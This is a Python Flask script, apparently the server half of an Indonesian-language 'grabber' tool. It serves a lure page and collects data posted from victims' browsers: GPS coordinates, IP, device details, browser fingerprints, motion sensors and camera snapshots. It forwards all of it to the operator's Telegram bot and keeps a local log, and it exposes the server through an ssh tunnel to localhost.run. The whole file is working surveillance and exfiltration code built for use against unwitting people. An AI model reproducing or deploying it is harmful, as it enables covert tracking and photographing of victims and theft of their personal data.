import os
import requests
from flask import Flask, request
from threading import Thread
from datetime import datetime
import base64
import json

# Dapatkan path folder saat ini (alat3/)
BASE = os.path.dirname(__file__)

# Konfigurasi input
TOKEN = input("[?] Masukkan Token Bot Telegram Lu: ")
CHAT_ID = input("[?] Masukkan Chat ID Telegram Lu: ")
try:
    PORT = int(input("[?] Masukkan Port Flask (default 8080): ") or 8080)
except:
    PORT = 8080

app = Flask(__name__, static_folder=os.path.join(BASE, "static"))

@app.route('/')
def home():
    try:
        return open(os.path.join(BASE, "index.html")).read()
    except FileNotFoundError:
        return "<h1>index.html tidak ditemukan 😢</h1>", 404

@app.route('/data', methods=['POST'])
def data_receiver():
    try:
        print("[*] Menerima data dari client...")
        data = request.get_json()
        waktu = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        ip       = data.get("ip", request.remote_addr)
        ua       = data.get("userAgent", "-")
        ram      = f'{data.get("memory", "-")} GB'
        cores    = data.get("cpuCores", "-")
        width    = data.get("width", "-")
        height   = data.get("height", "-")
        conn     = data.get("connection", "-")
        battery  = data.get("battery", {})
        level    = battery.get("level", "-")
        charging = "Charging" if battery.get("charging") else "Not Charging"
        lokasi   = data.get("location", {})
        lat      = lokasi.get("lat", "-")
        lon      = lokasi.get("lon", "-")
        acc      = lokasi.get("acc", "-")
        geo      = data.get("geo", {})
        country  = geo.get("country", "-")
        region   = geo.get("region", "-")
        city     = geo.get("city", "-")
        postal   = geo.get("postal", "-")
        referer  = data.get("referer", "-")
        path     = data.get("path", "-")
        motion   = data.get("motion", {})
        orient   = data.get("orientation", {})
        storage  = data.get("storage", {})
        canvasfp = data.get("canvasFP", "-")
        webglfp  = data.get("webglFP", {})
        audiofp  = data.get("audioFP", "-")
        snapshot = data.get("snapshot", "")

        resolusi = f"{width} x {height}"
        map_link = f"https://maps.google.com/?q={lat},{lon}" if lat != "-" and lon != "-" else "-"

        msg = f"""乂 📥 DATA TARGET MASUK 乂

┌─❐ INFO UTAMA
│ ◉ IP: {ip}
│ ◉ RAM: {ram}
│ ◉ CPU Cores: {cores}
│ ◉ Resolusi Layar: {resolusi}
│ ◉ Baterai: {level}% ({charging})
│ ◉ Koneksi: {conn}
└─❐

┌─❐ LOKASI
│ ◉ Negara: {country}
│ ◉ Provinsi: {region}
│ ◉ Kota: {city}
│ ◉ Kode Pos: {postal}
│ ◉ Latitude: {lat}
│ ◉ Longitude: {lon}
│ ◉ Akurasi: {acc} m
│ ◉ Google Maps: {map_link}
└─❐

┌─❐ FINGERPRINT
│ ◉ Canvas FP: {canvasfp[:30]}...
│ ◉ Audio FP: {audiofp[:30]}...
│ ◉ WebGL: {webglfp.get("vendor", "-")} / {webglfp.get("renderer", "-")}
└─❐

┌─❐ SENSOR
│ ◉ Motion: {motion}
│ ◉ Orientation: {orient}
└─❐

┌─❐ LAINNYA
│ ◉ Referer: {referer}
│ ◉ Path: {path}
│ ◉ Storage: {storage.get("usage", 0)} / {storage.get("quota", 0)} bytes
└─❐ Waktu: {waktu}
"""

        print(msg)

        if TOKEN and CHAT_ID:
            resp = requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", data={
                "chat_id": CHAT_ID,
                "text": msg
            })
            print("[TELEGRAM TEXT] Status:", resp.status_code)
            print("[TELEGRAM TEXT] Response:", resp.text)

            if snapshot and snapshot.startswith("data:image"):
                img_data = snapshot.split(",")[1]
                filename = os.path.join(BASE, "snapshot.png")
                with open(filename, "wb") as f:
                    f.write(base64.b64decode(img_data))
                with open(filename, "rb") as f:
                    resp = requests.post(f"https://api.telegram.org/bot{TOKEN}/sendPhoto", data={
                        "chat_id": CHAT_ID
                    }, files={"photo": f})
                    print("[TELEGRAM PHOTO] Status:", resp.status_code)
                    print("[TELEGRAM PHOTO] Response:", resp.text)
                os.remove(filename)

        with open(os.path.join(BASE, "logs.jsonl"), "a") as log:
            json.dump(data, log)
            log.write("\n")

        return "OK"

    except Exception as e:
        print("[X] ERROR:", str(e))
        return f"[!] ERROR: {e}"

def run():
    print("[✓] Menyalakan Flask Server...")
    Thread(target=lambda: app.run(host="0.0.0.0", port=PORT)).start()
    print("\n============================")
    print("📡 Silakan buat New Session dan jalankan:")
    print(f"🔗 ssh -R 80:localhost:{PORT} nokey@localhost.run")
    print("============================\n")
    while True:
        pass

if __name__ == '__main__':
    run()
